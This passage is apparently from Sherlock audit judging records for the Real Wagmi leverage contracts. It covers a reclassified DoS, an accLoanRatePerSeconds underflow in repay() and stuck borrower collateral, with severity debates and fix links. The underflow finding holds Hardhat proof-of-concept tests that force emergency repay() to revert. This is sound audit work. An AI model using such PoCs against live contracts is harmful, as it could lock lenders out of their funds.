https://github.com/RealWagmi/wagmi-leverage/commit/7937e25a2d344881c7c4fb202ed89965b0fed229\nIAm0x52\nEscalate\nThis is a valid issue but it should be medium rather than high. Impact is broken functionality and DOS which doesn't qualify as high.\nsherlock-admin2\nEscalate\nThis is a valid issue but it should be medium rather than high. Impact is broken functionality and DOS which doesn't qualify as high.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nAli-Shehab\nSome reports were accepted as high with similar impact: https://solodit.xyz/issues/h-2-possible-dos-in-rollerperiphery-approve-function-sherlock-sense-sense-git I don't know if am missing something.\nIAm0x52\nWhile I acknowledge the similarity of the issues, I have made my escalation based on current Sherlock rules which overrides previous judgments. Loss of functionality is a medium issue. The DOS could be over a year but only for some ranges/LP tokens which is why it is also medium.\nAli-Shehab\nBut can't we send any token and make it DOS?\nCzar102\nAs I understand, users wouldn't be able to create a borrow position for borrows with the active tick within the borrow tick range. This is a partial loss of the core functionality of the protocol, but doesn't lock any funds for >1 year. There also doesn't seem to be any loss of funds.\nCurrent interpretation of the Sherlock rules imply that when there is no loss of funds or funds locked, it is not a high issue. I think it should be downgraded to medium, so will be accepting the escalation if there are not counterarguments.\nAli-Shehab\nAlso, I want to remind you that there is an issue that doesn't relate to this bug: https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/37\nCzar102\nThe first escalation here concerns another issue, #37.\nWill be accepting both escalations. This will be downgraded to medium and #37 is not a duplicate. It is invalid.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nali-shehab: accepted\nIAm0x52: acceptedчMany positions would be unavailable to borrowers. For non-volatile positions like that which provide liquidity to stablecoin pools the DoS could last for very long period. For volatile positions that provide liquidity in a wide range this could also be for more than 1 year.\nCode Snippet\nTool used\nManual Review
Wrong `accLoanRatePerSeconds` in `repay()` can lead to underflowчmediumч"```\nit(""Updated accRate is incorrect"", async () => {\n        const amountWBTC = ethers.utils.parseUnits(""0.05"", 8); //token0\n        let deadline = (await time.latest()) + 60;\n        const minLeverageDesired = 50;\n        const maxCollateralWBTC = amountWBTC.div(minLeverageDesired);\n\n        const loans = [\n            {\n                liquidity: nftpos[3].liquidity,\n                tokenId: nftpos[3].tokenId,\n            },\n            {\n                liquidity: nftpos[5].liquidity,\n                tokenId: nftpos[5].tokenId,\n            },\n        ];\n\n        const swapParams: ApproveSwapAndPay.SwapParamsStruct = {\n            swapTarget: constants.AddressZero,\n            swapAmountInDataIndex: 0,\n            maxGasForCall: 0,\n            swapData: swapData,\n        };\n\n        const borrowParams = {\n            internalSwapPoolfee: 500,\n            saleToken: WETH_ADDRESS,\n            holdToken: WBTC_ADDRESS,\n            minHoldTokenOut: amountWBTC,\n            maxCollateral: maxCollateralWBTC,\n            externalSwap: swapParams,\n            loans: loans,\n        };\n\n        //borrow tokens\n        await borrowingManager.connect(bob).borrow(borrowParams, deadline);\n\n        await time.increase(3600 * 72); //72h so 2 days of missing collateral\n        deadline = (await time.latest()) + 60;\n\n        const borrowingKey = await borrowingManager.userBorrowingKeys(bob.address, 0);\n\n        let repayParams = {\n            isEmergency: true,\n            internalSwapPoolfee: 0,\n            externalSwap: swapParams,\n            borrowingKey: borrowingKey,\n            swapSlippageBP1000: 0,\n        };\n\n        const oldBorrowingInfo = await borrowingManager.borrowingsInfo(borrowingKey);\n        const dailyRateCollateral = await borrowingManager.checkDailyRateCollateral(borrowingKey);\n\n        //Alice emergency repay but it reverts with 2 days of collateral missing\n        await expect(borrowingManager.connect(alice).repay(repayParams, deadline)).to.be.revertedWithPanic();\n    });\n```\n"ч"Because the `repay()` function resets the `dailyRateCollateralBalance` to 0 when the lender call didn't fully close the position. We want to be able to compute the missing collateral again.\nTo do so we substract the percentage of collateral not paid to the `accLoanRatePerSeconds` so on the next call we will be adding extra second of fees that will allow the contract to compute the missing collateral.\nThe problem lies in the fact that we compute a percentage using the borrowed amount left instead of the initial borrow amount causing the percentage to be higher. In practice this do allows the contract to recompute the missing collateral.\nBut in the case of the missing `collateralBalance` or `removedAmt` being very high (ex: multiple days not paid or the loan removed was most of the position's liquidity) we might end up with a percentage higher than the `accLoanRatePerSeconds` which will cause an underflow.\nIn case of an underflow the call will revert and the lender will not be able to get his tokens back.\nConsider this POC that can be copied and pasted in the test files (replace all tests and just keep the setup & NFT creation):\n```\nit(""Updated accRate is incorrect"", async () => {\n        const amountWBTC = ethers.utils.parseUnits(""0.05"", 8); //token0\n        let deadline = (await time.latest()) + 60;\n        const minLeverageDesired = 50;\n        const maxCollateralWBTC = amountWBTC.div(minLeverageDesired);\n\n        const loans = [\n            {\n                liquidity: nftpos[3].liquidity,\n                tokenId: nftpos[3].tokenId,\n            },\n            {\n                liquidity: nftpos[5].liquidity,\n                tokenId: nftpos[5].tokenId,\n            },\n        ];\n\n        const swapParams: ApproveSwapAndPay.SwapParamsStruct = {\n            swapTarget: constants.AddressZero,\n            swapAmountInDataIndex: 0,\n            maxGasForCall: 0,\n            swapData: swapData,\n        };\n\n        const borrowParams = {\n            internalSwapPoolfee: 500,\n            saleToken: WETH_ADDRESS,\n            holdToken: WBTC_ADDRESS,\n            minHoldTokenOut: amountWBTC,\n            maxCollateral: maxCollateralWBTC,\n            externalSwap: swapParams,\n            loans: loans,\n        };\n\n        //borrow tokens\n        await borrowingManager.connect(bob).borrow(borrowParams, deadline);\n\n        await time.increase(3600 * 72); //72h so 2 days of missing collateral\n        deadline = (await time.latest()) + 60;\n\n        const borrowingKey = await borrowingManager.userBorrowingKeys(bob.address, 0);\n\n        let repayParams = {\n            isEmergency: true,\n            internalSwapPoolfee: 0,\n            externalSwap: swapParams,\n            borrowingKey: borrowingKey,\n            swapSlippageBP1000: 0,\n        };\n\n        const oldBorrowingInfo = await borrowingManager.borrowingsInfo(borrowingKey);\n        const dailyRateCollateral = await borrowingManager.checkDailyRateCollateral(borrowingKey);\n\n        //Alice emergency repay but it reverts with 2 days of collateral missing\n        await expect(borrowingManager.connect(alice).repay(repayParams, deadline)).to.be.revertedWithPanic();\n    });\n```\n"ч"Consider that when a lender do an emergency liquidity restoration they give up on their collateral missing and so use the initial amount in the computation instead of borrowed amount left.\n```\nborrowingStorage.accLoanRatePerSeconds =\n                    holdTokenRateInfo.accLoanRatePerSeconds -\n                    FullMath.mulDiv(\n                        uint256(-collateralBalance),\n                        Constants.BP,\n                        borrowing.borrowedAmount + removedAmt //old amount\n                    );\n```\n\nDiscussion\nfann95\nI think you are wrong in your conclusions. Try playing with emergency close tests. https://github.com/sherlock-audit/2023-10-real-wagmi/blob/b33752757fd6a9f404b8577c1eae6c5774b3a0db/wagmi-leverage/test/WagmiLeverageTests.ts#L990\nThe calculation must be made with the new borrowing.borrowedAmount, since in the future it will be used in the next calculation. The commission debt should be maintained and increase over time, and in your case, it is decreasing.\nfann95\nthis is your option\nand this is my option\nIn your version, the fee debt is reduced, although no one is paying it off.\nHHK-ETH\nEscalate\nWhile using the new `borrowing.borrowedAmount` make sense to keep the missing collateral balance it will lead to underflow if the `holdTokenRateInfo.accLoanRatePerSeconds` is too low (ex: the first user to borrow so `accLoanRatePerSeconds` started at the same time).\nTo find the missing collateral balance with a smaller borrowed amount, the only solution is to increase the percentage. But like I said, if you increase the percentage you might end up underflowing as the `accLoanRatePerSeconds` could be smaller.\nHere is a simple example:\nYou have 10 tokens of collateral missing and 200 tokens total and we remove 50 tokens. The rate is 1% daily.\n10 / 200 * 100 = 5% is the percentage value of the missing collateral compared to the amount borrowed.\nSince we were the first to borrow `accLoanRatePerSeconds` is pretty close to the missing collateral percentage, minus 1 day (user deposits at least 1 day of collateral when borrowing). 200*1/100 = 2 so the `accLoanRatePerSeconds` is 10+2 / 200 * 100 = 6%.\nIn the contract what we do instead is 10 / (200-50) * 100 = 6.66%. We do this because we want to be able to find the missing collateral using a smaller balance during the next call as the state is updated.\nThe substraction underflow because 6.66% > 6%.\nI did play with the emergency close tests. Here I reused it and added comments:\n```\nit(""emergency repay will be successful for PosManNFT owner if the collateral is depleted"", async () => {\n        let debt: LiquidityBorrowingManager.BorrowingInfoExtStructOutput[] =\n            await borrowingManager.getBorrowerDebtsInfo(bob.address);\n\n        await time.increase(debt[1].estimatedLifeTime.toNumber() + 3600 * 36); //add 36 hours as an example\n\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address); //update debt variable\n\n        let borrowingKey = await borrowingManager.userBorrowingKeys(bob.address, 1);\n\n        let swap_params = ethers.utils.defaultAbiCoder.encode(\n            [""address"", ""address"", ""uint256"", ""uint256""],\n            [constants.AddressZero, constants.AddressZero, 0, 0]\n        );\n        swapData = swapIface.encodeFunctionData(""swap"", [swap_params]);\n\n        let swapParams: ApproveSwapAndPay.SwapParamsStruct = {\n            swapTarget: constants.AddressZero,\n            swapAmountInDataIndex: 0,\n            maxGasForCall: 0,\n            swapData: swapData,\n        };\n\n        let params: LiquidityBorrowingManager.RepayParamsStruct = {\n            isEmergency: true, //emergency\n            internalSwapPoolfee: 0,\n            externalSwap: swapParams,\n            borrowingKey: borrowingKey,\n            swapSlippageBP1000: 0,\n        };\n\n        //console.log(debt);\n        let loans: LiquidityManager.LoanInfoStructOutput[] = await borrowingManager.getLoansInfo(borrowingKey);\n        expect(loans.length).to.equal(3);\n\n        let tokenRate = await borrowingManager.getHoldTokenDailyRateInfo(\n            debt[1].info.saleToken,\n            debt[1].info.holdToken\n        );\n\n        // We're going to repay alice loan which is [0] in loans array\n        const aliceLoanPercentage = loans[0].liquidity\n            .mul(100)\n            .div(loans[0].liquidity.add(loans[1].liquidity).add(loans[2].liquidity));\n        console.log(""Alice % of total borrow: "" + aliceLoanPercentage); //Alice liquidity is around 26% of the borrowing position\n\n        //Here we do like the smart contract does, try to see how much accLoanRatePerSeconds we need to remove to find back our missing collateral\n        //without removedAmount we use the new borrowed amount (current implementation)\n        let accToRemoveWithoutRemovedAmount = debt[1].collateralBalance\n            .mul(-1)\n            .mul(10_000)\n            .div(debt[1].info.borrowedAmount.mul(100 - aliceLoanPercentage.toNumber()).div(100));\n        //with removedAmount (proposed solution), we forfeit alice part of missing collateral since she emergency withdraw\n        let accToRemoveWithRemovedAmount = debt[1].collateralBalance\n            .mul(-1)\n            .mul(10_000)\n            .div(debt[1].info.borrowedAmount);\n\n        //this is the accLoanRatePerSeconds that we're going to substract from\n        console.log(""% to remove: "" + accToRemoveWithoutRemovedAmount);\n        console.log(""accLoanRatePerSeconds: "" + tokenRate.holdTokenRateInfo.accLoanRatePerSeconds);\n\n        //for now even after 36hours we're still less than accLoanRatePerSeconds so no underflow\n        console.log(""% to remove is less than accLoanRatePerSeconds"");\n        expect(tokenRate.holdTokenRateInfo.accLoanRatePerSeconds.gt(accToRemoveWithoutRemovedAmount));\n\n        //let's add 12 more hours\n        await time.increase(3600 * 12); //add 12 hours\n\n        tokenRate = await borrowingManager.getHoldTokenDailyRateInfo(debt[1].info.saleToken, debt[1].info.holdToken); //update token rate\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address); //update debt variable\n        accToRemoveWithoutRemovedAmount = debt[1].collateralBalance\n            .mul(-1)\n            .mul(10_000)\n            .div(debt[1].info.borrowedAmount.mul(100 - aliceLoanPercentage.toNumber()).div(100));\n        accToRemoveWithRemovedAmount = debt[1].collateralBalance.mul(-1).mul(10_000).div(debt[1].info.borrowedAmount);\n\n        console.log(""% to remove: "" + accToRemoveWithoutRemovedAmount);\n        console.log(""accLoanRatePerSeconds: "" + tokenRate.holdTokenRateInfo.accLoanRatePerSeconds);\n\n        //the accToRemoveWithoutRemovedAmount is now greater than accLoanRatePerSeconds\n        console.log(""% to remove is greater than accLoanRatePerSeconds thus it will underflow"");\n        expect(tokenRate.holdTokenRateInfo.accLoanRatePerSeconds.lt(accToRemoveWithoutRemovedAmount));\n\n        let deadline = (await time.latest()) + 60;\n\n        //this is going to revert with underflow\n        await expect(borrowingManager.connect(alice).repay(params, deadline)).to.be.reverted;\n        /**\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[0].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[1].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[2].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[3].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[4].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[5].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getBorrowerDebtsCount(bob.address)).to.be.equal(2);\n\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address);\n        //console.log(debt);\n        loans = await borrowingManager.getLoansInfo(borrowingKey);\n        expect(loans.length).to.equal(2);\n        \n        await time.increase(100);\n        deadline = (await time.latest()) + 60;\n        await expect(borrowingManager.connect(bob).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, bob.address, borrowingKey);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[0].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[1].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[2].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[3].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[4].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[5].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getBorrowerDebtsCount(bob.address)).to.be.equal(2);\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address);\n        //console.log(debt);\n        loans = await borrowingManager.getLoansInfo(borrowingKey);\n        expect(loans.length).to.equal(1);\n\n        await time.increase(100);\n        deadline = (await time.latest()) + 60;\n        await expect(borrowingManager.connect(owner).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, owner.address, borrowingKey);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[0].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[1].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[2].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[3].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[4].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[5].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getBorrowerDebtsCount(bob.address)).to.be.equal(1);*/\n    });\n```\n\nIn this example Alice represents only 26% of the borrowed amount and the `accLoanRatePerSeconds` started before this loan so a longer time is needed (here I did 48hours) but if the user calling emergency repay has a much higher percentage or it's the first borrow it wouldn't need as much time.\nI understand that my solution might not be what you want, but the underflow problem do exist.\nsherlock-admin2\nEscalate\nWhile using the new `borrowing.borrowedAmount` make sense to keep the missing collateral balance it will lead to underflow if the `holdTokenRateInfo.accLoanRatePerSeconds` is too low (ex: the first user to borrow so `accLoanRatePerSeconds` started at the same time).\nTo find the missing collateral balance with a smaller borrowed amount, the only solution is to increase the percentage. But like I said, if you increase the percentage you might end up underflowing as the `accLoanRatePerSeconds` didn't change.\nHere is a simple example:\nYou have 10 tokens of collateral missing and 200 tokens total and we remove 50 tokens. The rate is 1% daily.\n10 / 200 * 100 = 5% is the percentage value of the missing collateral compared to the amount borrowed.\nSince we were the first to borrow `accLoanRatePerSeconds` is pretty close to the missing collateral percentage, minus 1 day (user deposits at least 1 day of collateral when borrowing). 200*1/100 = 2 so the `accLoanRatePerSeconds` is 10+2 / 200 * 100 = 6%.\nIn the contract what we do instead is 10 / (200-50) * 100 = 6.66%. We do this because we want to be able to find the missing collateral using a smaller balance during the next call as the state is updated.\nThe substraction underflow because 6% > 5%.\nI did play with the emergency close tests. Here I reused it and added comments:\nit(""emergency repay will be successful for PosManNFT owner if the collateral is depleted"", async () => {\n        let debt: LiquidityBorrowingManager.BorrowingInfoExtStructOutput[] =\n            await borrowingManager.getBorrowerDebtsInfo(bob.address);\n\n        await time.increase(debt[1].estimatedLifeTime.toNumber() + 3600 * 36); //add 36 hours as an example\n\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address); //update debt variable\n\n        let borrowingKey = await borrowingManager.userBorrowingKeys(bob.address, 1);\n\n        let swap_params = ethers.utils.defaultAbiCoder.encode(\n            [""address"", ""address"", ""uint256"", ""uint256""],\n            [constants.AddressZero, constants.AddressZero, 0, 0]\n        );\n        swapData = swapIface.encodeFunctionData(""swap"", [swap_params]);\n\n        let swapParams: ApproveSwapAndPay.SwapParamsStruct = {\n            swapTarget: constants.AddressZero,\n            swapAmountInDataIndex: 0,\n            maxGasForCall: 0,\n            swapData: swapData,\n        };\n\n        let params: LiquidityBorrowingManager.RepayParamsStruct = {\n            isEmergency: true, //emergency\n            internalSwapPoolfee: 0,\n            externalSwap: swapParams,\n            borrowingKey: borrowingKey,\n            swapSlippageBP1000: 0,\n        };\n\n        //console.log(debt);\n        let loans: LiquidityManager.LoanInfoStructOutput[] = await borrowingManager.getLoansInfo(borrowingKey);\n        expect(loans.length).to.equal(3);\n\n        let tokenRate = await borrowingManager.getHoldTokenDailyRateInfo(\n            debt[1].info.saleToken,\n            debt[1].info.holdToken\n        );\n\n        // We're going to repay alice loan which is [0] in loans array\n        const aliceLoanPercentage = loans[0].liquidity\n            .mul(100)\n            .div(loans[0].liquidity.add(loans[1].liquidity).add(loans[2].liquidity));\n        console.log(aliceLoanPercentage); //Alice liquidity is around 26% of the borrowing position\n\n        //Here we do like the smart contract does, try to see how much `accLoanRatePerSeconds` we need to remove to find back our missing collateral\n        //without removedAmount (proposed solution), we forfeit alice part of missing collateral since she emergency withdraw\n        let accToRemoveWithoutRemovedAmount = debt[1].collateralBalance\n            .mul(-1)\n            .mul(10_000)\n            .div(debt[1].info.borrowedAmount.mul(100 - aliceLoanPercentage.toNumber()).div(100));\n        //with removedAmount (current implmentation)\n        let accToRemoveWithRemovedAmount = debt[1].collateralBalance\n            .mul(-1)\n            .mul(10_000)\n            .div(debt[1].info.borrowedAmount);\n\n        //this is the `accLoanRatePerSeconds` that we're going to substract from\n        console.log(tokenRate.holdTokenRateInfo.accLoanRatePerSeconds);\n\n        //for now even after 36hours we're still less than `accLoanRatePerSeconds` so no underflow\n        expect(tokenRate.holdTokenRateInfo.accLoanRatePerSeconds.gt(accToRemoveWithRemovedAmount));\n\n        //let's add 12 more hours\n        await time.increase(debt[1].estimatedLifeTime.toNumber() + 3600 * 12); //add 12 hours\n\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address); //update debt variable\n        accToRemoveWithoutRemovedAmount = debt[1].collateralBalance\n            .mul(-1)\n            .mul(10_000)\n            .div(debt[1].info.borrowedAmount.mul(100 - aliceLoanPercentage.toNumber()).div(100));\n        accToRemoveWithRemovedAmount = debt[1].collateralBalance.mul(-1).mul(10_000).div(debt[1].info.borrowedAmount);\n\n        //the accToRemoveWithRemovedAmount is now greater than `accLoanRatePerSeconds`\n        expect(tokenRate.holdTokenRateInfo.accLoanRatePerSeconds.lt(accToRemoveWithRemovedAmount));\n\n        let deadline = (await time.latest()) + 60;\n\n        //this is going to revert with underflow\n        await expect(borrowingManager.connect(alice).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, alice.address, borrowingKey);\n\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[0].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[1].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[2].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[3].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[4].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[5].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getBorrowerDebtsCount(bob.address)).to.be.equal(2);\n\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address);\n        //console.log(debt);\n        loans = await borrowingManager.getLoansInfo(borrowingKey);\n        expect(loans.length).to.equal(2);\n        /**\n        await time.increase(100);\n        deadline = (await time.latest()) + 60;\n        await expect(borrowingManager.connect(bob).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, bob.address, borrowingKey);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[0].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[1].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[2].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[3].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[4].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[5].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getBorrowerDebtsCount(bob.address)).to.be.equal(2);\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address);\n        //console.log(debt);\n        loans = await borrowingManager.getLoansInfo(borrowingKey);\n        expect(loans.length).to.equal(1);\n\n        await time.increase(100);\n        deadline = (await time.latest()) + 60;\n        await expect(borrowingManager.connect(owner).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, owner.address, borrowingKey);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[0].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[1].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[2].tokenId)).to.be.equal(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[3].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[4].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getLenderCreditsCount(nftpos[5].tokenId)).to.be.gt(0);\n        expect(await borrowingManager.getBorrowerDebtsCount(bob.address)).to.be.equal(1);*/\n    });\nIn this example Alice represents only 26% of the borrowed amount and the `accLoanRatePerSeconds` started before this loan so a longer time is needed (here I did 48hours) but if the user calling emergency repay has a much higher percentage or it's the first borrow it wouldn't need as much time.\nI understand that my solution might not be what you want, but the underflow problem do exist.\nThe escalation could not be created because you are not exceeding the escalation threshold.\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page, in the Sherlock webapp.\nfann95\n`debt = await borrowingManager.getBorrowerDebtsInfo(bob.address); //update debt variable`\ntokenRate also needs to be updated like the debt variable\nHHK-ETH\nRight, my bad sorry wrote the test quickly. Updated my comment with the new token rate, `repay` still underflow.\nHHK-ETH\n@fann95 @cvetanovv sorry to bother but would appreciate if you could read the escalation comment again and run the 2 POCs provided (comment and initial finding) before escalation period ends.\nThe `repay()` reverts with underflow when increasing the missing collateral to a certain amount (just a few days in the examples given). I tried to explain that it comes from the `accLoanRatePerSeconds` calculation. I'll happily take the blame if I'm wrong and will be sorry for the time wasted but if I'm right this is problably something we want to fix or lenders might not be able to call `repay` and will have to count on liquidators.\nchewonithard\nissue 195 is also similar. I think both issues should be reconsidered to be valid.\nThis bug is easily replicated using protocol's own default test file WagmiLeverageTests.ts by changing line 1040 to 100_000 seconds (~1 day)\nExpecting an under-collateralized loan to not be liquidated in ~1 day is not unrealistic, after which the failure of emergency mode represents a significant impact to a critical protocol function.\nCzar102\n@fann95 @cvetanovv could you take a look at this and #195?\ncvetanovv\nShould be duplicated and rather seem valid to me\nCzar102\n@fann95 could you post your opinion on this issue? It seems to be valid.\nfann95\nI looked at this problem one more and realized: yes, this is a mistake. When a liquidity provider withdraws its liquidity, it also surrenders its fee debt, so the debt must be reduced in proportion to the reduction in liquidity.\nfann95\nI came to an interesting conclusion: the borrowingStorage.accLoanRatePerSeconds does not need to be recalculated. It should remain the same as it was, and the borrowed amount should be decreased only. So, accordingly, the fee debt will be reduced during a future recalculation. Fixed: https://github.com/RealWagmi/wagmi-leverage/commit/4d355d8cafc86f1341af7b5acfb485a2a33ce61a\nCzar102\n@fann95 may I ask why do you consider this a high severity issue? It seems the watson classified this as medium severity.\nCzar102\nAgree with medium severity. Will be accepting the escalation."чMedium. Lender might not be able to use `isEmergency` on `repay()` and will have to do a normal liquidation if he want his liquidity back.\nCode Snippet\nTool used\nManual Review
Borrower collateral that they are owed can get stuck in Vault and not sent back to them after calling `repay`чmediumч```\n            if (\n                collateralBalance > 0 &&\n                (currentFees + borrowing.feesOwed) / Constants.COLLATERAL_BALANCE_PRECISION >\n                Constants.MINIMUM_AMOUNT\n            ) {\n                liquidationBonus +=\n                    uint256(collateralBalance) /\n                    Constants.COLLATERAL_BALANCE_PRECISION;\n            } else {\n                currentFees = borrowing.dailyRateCollateralBalance;\n            }\n```\nчFirst, let's say that a borrower called `borrow` in `LiquidityBorrowingManager`. Then, they call increase `increaseCollateralBalance` with a large collateral amount. A short time later, they decide they want to `repay` so they call `repay`.\nIn `repay`, we have the following code:\n```\n            if (\n                collateralBalance > 0 &&\n                (currentFees + borrowing.feesOwed) / Constants.COLLATERAL_BALANCE_PRECISION >\n                Constants.MINIMUM_AMOUNT\n            ) {\n                liquidationBonus +=\n                    uint256(collateralBalance) /\n                    Constants.COLLATERAL_BALANCE_PRECISION;\n            } else {\n                currentFees = borrowing.dailyRateCollateralBalance;\n            }\n```\n\nNotice that if we have `collateralBalance > 0` BUT `!((currentFees + borrowing.feesOwed) / Constants.COLLATERAL_BALANCE_PRECISION > Constants.MINIMUM_AMOUNT)` (i.e. the first part of the if condition is fine but the second is not. It makes sense the second part is not fine because the borrower is repaying not long after they borrowed, so fees haven't had a long time to accumulate), then we will still go to `currentFees = borrowing.dailyRateCollateralBalance;` but we will not do:\n```\n                liquidationBonus +=\n                    uint256(collateralBalance) /\n                    Constants.COLLATERAL_BALANCE_PRECISION;\n```\n\nHowever, later on in the code, we have:\n```\n            Vault(VAULT_ADDRESS).transferToken(\n                borrowing.holdToken,\n                address(this),\n                borrowing.borrowedAmount + liquidationBonus\n            );\n```\n\nSo, the borrower's collateral will actually not even be sent back to the LiquidityBorrowingManager from the Vault (since we never incremented liquidationBonus). We later do:\n```\n            _pay(borrowing.holdToken, address(this), msg.sender, holdTokenBalance);\n            _pay(borrowing.saleToken, address(this), msg.sender, saleTokenBalance);\n```\n\nSo clearly the user will not receive their collateral back.ч"You should separate:\n```\n            if (\n                collateralBalance > 0 &&\n                (currentFees + borrowing.feesOwed) / Constants.COLLATERAL_BALANCE_PRECISION >\n                Constants.MINIMUM_AMOUNT\n            ) {\n                liquidationBonus +=\n                    uint256(collateralBalance) /\n                    Constants.COLLATERAL_BALANCE_PRECISION;\n            } else {\n                currentFees = borrowing.dailyRateCollateralBalance;\n            }\n```\n\nInto two separate if statements. One should check if `collateralBalance > 0`, and if so, increment liquidationBonus. The other should check `(currentFees + borrowing.feesOwed) / Constants.COLLATERAL_BALANCE_PRECISION > Constants.MINIMUM_AMOUNT` and if not, set `currentFees = borrowing.dailyRateCollateralBalance;`.\nDiscussion\nfann95\nFixed: https://github.com/RealWagmi/wagmi-leverage/commit/96ad6c13b3f5e37e3b13fd53991f69c5d1b07f87\nIAm0x52\nEscalate\nThis is a valid issue but it should be medium rather than high as it only occurs under very specific circumstances. For most collaterals this would only occur of the user borrows and repays in the same block or if the borrow amount is exceptionally low.\nsherlock-admin2\nEscalate\nThis is a valid issue but it should be medium rather than high as it only occurs under very specific circumstances. For most collaterals this would only occur of the user borrows and repays in the same block or if the borrow amount is exceptionally low.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ndetectiveking123\nDisagree with the escalation.\nTo name a few things,\nUser could lose a large amount of funds if `increaseCollateralBalance` is called first, as my report mentions. The amount of funds lost here could be quite high.\nThe escalation says: ""For most collaterals this would only occur of the user borrows and repays in the same block or if the borrow amount is exceptionally low."" <- This seems incorrect, you could easily wait a few minutes before returning on a decently sized collateral and still lose some funds. But for sure the worst case is waiting a few seconds to return on a higher amount of funds. I argue that this is actually quite a common use case. This brings me to my next point.\nRemember that this is a trading protocol at the end of the day. Borrowing and repaying is a trade. Many traders employ high frequency strategies, and might open a position and attempt to close a short time afterwards (even in the next block, for example). This is extremely common if you look at well known on-chain perp protocols. I maintain that a large number of traders would run into this issue and lose funds.\nIAm0x52\nA single 18 dp token is 10^18. At the minimum interest of 0.1% per day the interest per second is:\n10^18 * 0.001 / 86400 = 11.574 * 10^9\nThis is such higher than the MINIMUM_AMOUNT of 1000. This means that any 18 dp token (unless each token was valued at $11,500,000 which currently doesn't exist) would only suffer from this if closed in the same block.\nFor 6 dp tokens:\n10^6 * 0.001 / 86400 = 1.1574 * 10^-2\nThis means that 6 dp positions over 86400 would not suffer from this unless closed in the same block.\nFor ETH with a block time of 12 seconds, a position of 7200 could be closed by the next block and not suffer from this.\nAs stated above this only affects limited number of tokens/positions and should therefore be medium not high.\ndetectiveking123\nFor the dp point, I think USDC and USDT are tokens that constitute an extremely large portion of the market share here, so I disagree with your ""limited number of tokens"" point. Also, as you kind of alluded to, each (10^6) token can be worth more than $1.\nNonetheless, I personally think $86,400 per position is a lot of money (and the total number of funds at risk is much higher, since this bug can be repeated for every position. This isn't even taking a potential call to 